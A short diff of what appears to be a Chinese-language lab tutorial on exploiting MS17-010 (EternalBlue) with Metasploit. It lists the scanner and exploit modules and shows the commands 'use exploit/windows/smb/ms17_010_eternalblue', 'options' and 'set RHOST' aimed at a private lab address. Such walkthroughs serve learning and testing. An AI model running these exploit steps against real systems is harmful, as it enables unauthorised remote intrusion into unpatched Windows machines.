@@ -24,7 +24,7 @@ win64:	192.168.19.2（防火墙允许文件与打印机共享)
 `exploit/windows/smb/ms17_010_psexec` \
 其中前2个插件是auxiliary下的，属于辅助验证程序,用来扫描的。3和4是exploit下的,用来攻击。 \
 注意到,msf的模块目录是在/usr/share/metasploit-framework/modules \
-`use exploit/windows/smb/ms17_010_eternalblue`  调用攻击模块
+`use exploit/windows/smb/ms17_010_eternalblue`   /调用攻击模块 \
 `options` \
 查看参数,并设置： \
 `set RHOST 192.168.43.2` \
